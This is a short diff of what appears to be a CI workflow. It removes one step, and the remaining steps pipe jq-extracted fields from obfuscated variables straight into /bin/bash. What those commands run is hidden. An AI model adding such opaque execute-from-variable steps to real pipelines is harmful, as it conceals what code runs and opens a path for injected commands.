@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$z88875" | jq -r .y7313 | /bin/bash
           echo $bb6114 | jq -r .mlrlc58634 | /bin/bash
           echo $plxm10270 | jq -r .dfg633 | /bin/bash
-          echo $pan393 | jq -r .maj4 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
